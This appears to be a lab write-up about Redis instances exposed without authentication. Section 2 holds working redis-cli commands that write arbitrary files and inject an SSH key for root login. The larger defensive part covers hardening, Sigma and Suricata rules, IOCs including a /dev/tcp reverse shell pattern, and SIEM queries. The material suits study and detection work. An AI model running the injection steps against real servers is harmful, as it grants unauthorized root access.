# Redis Unauthorized Access — Arbitrary File Write / SSH Key Injection

## 1. CVE Background & Impact

| Field | Value |
|-------|-------|
| CVE ID | N/A (Misconfiguration, not a code vulnerability) |
| CVSS | 9.8 (Critical — when exposed to network) |
| Affected | Any Redis instance without authentication + network-exposed |
| Type | Unauthorized Access → Arbitrary File Write → RCE |
| MITRE ATT&CK | T1190 (Exploit Public-Facing App), T1098.004 (SSH Authorized Keys), T1053.003 (Cron) |

Redis by default binds to all interfaces (0.0.0.0:6379) with no authentication. When exposed to the network, an attacker can execute arbitrary Redis commands including `CONFIG SET` to change the database dump location, effectively writing arbitrary content to any file the Redis process can access.

Common exploitation paths:
- Write SSH public key to `/root/.ssh/authorized_keys` → SSH login
- Write crontab to `/var/spool/cron/root` → reverse shell
- Write webshell to web root → RCE via HTTP

This is one of the most common attack vectors in Chinese red team exercises and real-world breaches.

## 2. Reproduction Steps

**Environment**: Redis 4.0.14 (no auth, bind 0.0.0.0) — via vulhub `redis/4-unacc`.

**Attack Chain**:

```
┌──────────┐  redis-cli (no auth)  ┌───────────────┐
│ Attacker │ ────────────────────► │ Redis (6379)  │
└──────────┘                       └───────┬───────┘
  1. CONFIG SET dir /root/.ssh/            │
  2. CONFIG SET dbfilename authorized_keys │
  3. SET x "\n\n<ssh-rsa AAAA...>\n\n"     │
  4. BGSAVE                                │
     └── writes RDB dump as authorized_keys
  5. ssh -i key root@target ──► shell      │
```

**Steps**:
1. Start target: `docker compose up -d` (Redis on :6379)
2. Verify unauthenticated access: `redis-cli -h target PING` → `PONG`
3. Write arbitrary file (PoC):
```bash
redis-cli -h target CONFIG SET dir /tmp/
redis-cli -h target CONFIG SET dbfilename pwned.txt
redis-cli -h target SET x "REDIS_UNAUTH_RCE_PROOF"
redis-cli -h target BGSAVE
# Verify: file /tmp/pwned.txt now contains our string
```
4. SSH key attack (when Redis runs as root):
```bash
ssh-keygen -t rsa -f redis_key -N ""
PUBKEY=$(cat redis_key.pub)
redis-cli -h target CONFIG SET dir /root/.ssh/
redis-cli -h target CONFIG SET dbfilename authorized_keys
redis-cli -h target SET x "\n\n${PUBKEY}\n\n"
redis-cli -h target BGSAVE
ssh -i redis_key root@target
```

Note: In this vulhub container, Redis runs as non-root user so /root/.ssh/ is not writable. The /tmp write demonstrates the core vulnerability. Real-world Redis deployments running as root are common in legacy Chinese infrastructure.

## 3. Defense

### 3.1 Hardening / Patches / Mitigations

1. **Set authentication**: `requirepass <strong_password>` in redis.conf
2. **Bind to localhost**: `bind 127.0.0.1` — never expose Redis to 0.0.0.0
3. **Disable dangerous commands**: `rename-command CONFIG ""`, `rename-command FLUSHALL ""`, `rename-command FLUSHDB ""`, `rename-command DEBUG ""`
4. **Run as non-root user**: Create dedicated `redis` user with minimal permissions
5. **Enable protected mode**: `protected-mode yes` (default since Redis 3.2, but often disabled)
6. **Network segmentation**: Place Redis behind firewall, only allow application servers
7. **Use ACLs** (Redis 6+): Fine-grained per-user command restrictions
8. **TLS encryption**: Enable TLS for Redis connections (Redis 6+)
9. **File system permissions**: Ensure Redis data directory has strict ownership (redis:redis 750)

### 3.2 Detection (Narrative)

**Network Monitoring**:
Redis protocol is plaintext. Monitor port 6379 for connections from unauthorized IPs. Any external IP connecting to Redis is immediately suspicious.

**Auditd / File Integrity**:
Monitor for unexpected file creation in sensitive directories (/root/.ssh/, /var/spool/cron/, web roots). The Redis RDB dump has a distinctive binary header (`REDIS0008...`) that can be detected.

**Redis Logging**:
Enable Redis slowlog and monitor for CONFIG commands. In production, CONFIG SET should never be called from client connections.

### 3.3 Threat Hunting (Narrative)

**Network**:
- Scan for Redis instances exposed to non-private IPs (Shodan/Censys query: `port:6379 product:Redis`)
- Check firewall logs for inbound connections to 6379 from unexpected sources
- Look for Redis RESP protocol patterns in network captures

**File System**:
- Check authorized_keys files for unexpected entries (especially with Redis RDB binary artifacts around the key)
- Look for crontab entries containing reverse shell commands
- Search for files with Redis RDB magic bytes (`REDIS0008`) in unexpected locations

**Configuration Audit**:
- Verify all Redis instances have `requirepass` set
- Verify `bind` is set to 127.0.0.1 or specific internal IPs
- Check if `protected-mode` is enabled
- Audit `rename-command` settings for dangerous commands

### 3.4 SOC Artifacts

#### 3.4.1 Sigma Rule — Redis Unauthorized CONFIG SET

```yaml
title: Redis Unauthorized CONFIG SET Command for File Write
id: f6a8b0c2-5d7e-9f1a-3b4c-6d8e0f2a4b6c
status: stable
level: critical
description: >
  Detects Redis CONFIG SET commands that change the dump directory or filename,
  indicating potential unauthorized file write exploitation.
references:
  - https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
author: Security Lab
date: 2026/05/21
tags:
  - attack.initial_access
  - attack.t1190
  - attack.persistence
  - attack.t1098.004
logsource:
  category: network_connection
  product: redis
detection:
  selection:
    dst_port: 6379
    payload|contains:
      - 'CONFIG SET dir'
      - 'CONFIG SET dbfilename'
  condition: selection
falsepositives:
  - Legitimate Redis administration (should be from known admin IPs only)
```

#### 3.4.2 Sigma Rule — SSH authorized_keys Modified by Non-SSH Process

```yaml
title: Suspicious Modification of SSH authorized_keys
id: a7b9c1d3-6e8f-0a2b-4c5d-7e9f1a3b5c7d
status: stable
level: high
description: >
  Detects modification of SSH authorized_keys files by processes other than
  SSH or known management tools, indicating potential Redis key injection.
author: Security Lab
date: 2026/05/21
tags:
  - attack.persistence
  - attack.t1098.004
logsource:
  category: file_event
  product: linux
detection:
  selection:
    TargetFilename|endswith: '/authorized_keys'
  filter_legitimate:
    Image|endswith:
      - '/sshd'
      - '/ssh-keygen'
      - '/ansible'
  condition: selection and not filter_legitimate
falsepositives:
  - Automated key management systems (Puppet, Chef, Ansible)
```

#### 3.4.3 Suricata Rules

```
# Redis Unauthorized Access - CONFIG SET Command
alert tcp $EXTERNAL_NET any -> $HOME_NET 6379 (
  msg:"ET EXPLOIT Redis Unauthorized CONFIG SET dir (File Write Attack)";
  flow:established,to_server;
  content:"CONFIG"; nocase;
  content:"SET"; distance:0; nocase;
  content:"dir"; distance:0; nocase;
  classtype:attempted-admin;
  sid:6379001;
  rev:1;
  metadata:attack_target Server, deployment Internal, tag Redis-Unauth;
)

# Redis Unauthorized Access - Writing to SSH directory
alert tcp $EXTERNAL_NET any -> $HOME_NET 6379 (
  msg:"ET EXPLOIT Redis SSH Key Injection (authorized_keys write)";
  flow:established,to_server;
  content:"CONFIG"; nocase;
  content:"SET"; distance:0; nocase;
  content:"authorized_keys"; distance:0; nocase;
  classtype:attempted-admin;
  sid:6379002;
  rev:1;
  metadata:attack_target Server, deployment Internal, tag Redis-Unauth;
)

# Redis Unauthorized Access - Writing to cron directory
alert tcp $EXTERNAL_NET any -> $HOME_NET 6379 (
  msg:"ET EXPLOIT Redis Crontab Injection (spool write)";
  flow:established,to_server;
  content:"CONFIG"; nocase;
  content:"SET"; distance:0; nocase;
  content:"spool"; distance:0; nocase;
  classtype:attempted-admin;
  sid:6379003;
  rev:1;
  metadata:attack_target Server, deployment Internal, tag Redis-Unauth;
)
```

#### 3.4.4 Structured IOC Table

| Type | Indicator | Confidence | Notes |
|------|-----------|------------|-------|
| Network | Inbound connection to 6379 from external IP | High | Unauthorized Redis access |
| Command | `CONFIG SET dir /root/.ssh` | Critical | SSH key injection setup |
| Command | `CONFIG SET dbfilename authorized_keys` | Critical | SSH key injection |
| Command | `CONFIG SET dir /var/spool/cron` | Critical | Crontab injection |
| Command | `CONFIG SET dir /var/www` | High | Webshell write |
| File | authorized_keys with RDB binary header (`REDIS0008`) | Critical | Redis-written SSH key |
| File | Crontab entry with reverse shell (bash -i >& /dev/tcp/) | Critical | Redis cron exploitation |
| File | New files with Redis RDB magic bytes in web/ssh/cron dirs | High | Arbitrary file write artifact |
| Process | Redis process writing outside /var/lib/redis or /data | High | Exploitation in progress |
| Config | Redis without `requirepass` | Critical | Vulnerable configuration |
| Config | Redis with `bind 0.0.0.0` or no bind directive | High | Network-exposed |
| Config | Redis with `protected-mode no` | High | Protection disabled |

#### 3.4.5 SIEM Hunting Queries

**Splunk SPL — Detect Redis CONFIG SET Commands**:

```spl
index=network sourcetype=stream:tcp dest_port=6379
| where match(payload, "(?i)CONFIG\s+SET\s+(dir|dbfilename)")
| stats count values(payload) as commands by src_ip, dest_ip, _time
| sort -_time
| table src_ip dest_ip commands count _time
```

**Splunk SPL — SSH authorized_keys Modification (Non-SSH Process)**:

```spl
index=linux sourcetype=auditd type=SYSCALL
  (name="/root/.ssh/authorized_keys" OR name="/home/*/.ssh/authorized_keys")
| where NOT match(exe, "(sshd|ssh-keygen|ansible|puppet)")
| table _time host exe name uid auid
| sort -_time
```

**Microsoft Sentinel KQL — Redis Unauthorized External Access**:

```kql
CommonSecurityLog
| where DestinationPort == 6379
    and not(ipv4_is_private(SourceIP))
| summarize ConnectionCount=count(), FirstSeen=min(TimeGenerated),
    LastSeen=max(TimeGenerated) by SourceIP, DestinationIP
| where ConnectionCount > 1
| sort by ConnectionCount desc
```

**Microsoft Sentinel KQL — authorized_keys File Tampering**:

```kql
DeviceFileEvents
| where FileName == "authorized_keys"
    and ActionType in ("FileCreated", "FileModified")
    and InitiatingProcessFileName !in~ ("sshd", "ssh-keygen", "ansible-playbook")
| project Timestamp, DeviceName, FolderPath, InitiatingProcessFileName,
    InitiatingProcessCommandLine, AccountName
| sort by Timestamp desc
```

## 4. References

- [HackTricks - Redis Pentesting](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)
- [Redis Security Documentation](https://redis.io/docs/management/security/)
- [MITRE ATT&CK T1098.004 - SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004/)
- [Shodan Redis Exposure Report](https://www.shodan.io/search?query=port%3A6379+product%3ARedis)
- [CNCERT Redis Unauthorized Advisory (CN)](https://www.cnvd.org.cn/flaw/show/CNVD-2015-07557)
